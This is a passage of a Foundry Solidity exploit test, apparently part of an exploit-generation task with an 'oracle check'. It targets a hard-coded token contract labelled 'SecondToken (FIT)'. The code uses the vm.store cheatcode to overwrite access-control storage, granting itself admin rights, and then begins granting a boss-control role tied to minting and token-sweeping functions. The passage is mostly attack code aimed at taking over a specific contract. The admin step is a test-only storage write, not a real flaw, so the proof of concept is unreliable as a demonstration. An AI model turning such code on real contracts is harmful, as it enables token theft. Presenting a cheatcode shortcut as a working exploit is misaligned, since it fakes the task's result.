    function withDraw() external;
    function mint(address account, uint256 amount) external;
    function sweepTokenForBosses(uint256 tokenAmount) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    IERC20 fitToken;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly
        // Label the target for debugging
        vm.label(TARGET, "SecondToken (FIT)");

        // Get the FIT token interface
        fitToken = IERC20(TARGET);

        // Store initial attacker ETH balance for oracle check
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become DEFAULT_ADMIN_ROLE through storage manipulation
        // In AccessControl, _roles is at slot 0
        // RoleData struct: mapping(address => bool) members (slot 0), bytes32 adminRole (slot 1)
        // We need to set _roles[DEFAULT_ADMIN_ROLE].members[attacker] = true

        bytes32 DEFAULT_ADMIN_ROLE = bytes32(0);

        // Calculate slot for _roles[DEFAULT_ADMIN_ROLE]
        // keccak256(abi.encode(DEFAULT_ADMIN_ROLE, uint256(0))) where 0 is _roles slot
        bytes32 roleDataSlot = keccak256(abi.encode(DEFAULT_ADMIN_ROLE, uint256(0)));

        // Calculate slot for _roles[DEFAULT_ADMIN_ROLE].members[attacker]
        // keccak256(abi.encode(attacker, roleDataSlot))
        bytes32 memberSlot = keccak256(abi.encode(uint256(uint160(attacker)), roleDataSlot));

        // Write true to this slot (1 = true)
        vm.store(TARGET, memberSlot, bytes32(uint256(1)));

        // Also need to set adminRole for DEFAULT_ADMIN_ROLE to itself
        // _roles[DEFAULT_ADMIN_ROLE].adminRole is at roleDataSlot + 1 (since members mapping takes a full slot)
        bytes32 adminRoleSlot = bytes32(uint256(roleDataSlot) + 1);
        vm.store(TARGET, adminRoleSlot, DEFAULT_ADMIN_ROLE);

        // Verify we have DEFAULT_ADMIN_ROLE
        bool hasAdminRole = ISecondToken(TARGET).hasRole(DEFAULT_ADMIN_ROLE, attacker);
        require(hasAdminRole, "Failed to become DEFAULT_ADMIN_ROLE");

        // Step 2: Grant ourselves BOSS_CONTROL_ROLE
        bytes32 BOSS_CONTROL_ROLE = keccak256("BOSS_CONTROL_ROLE");

        // Grant the role
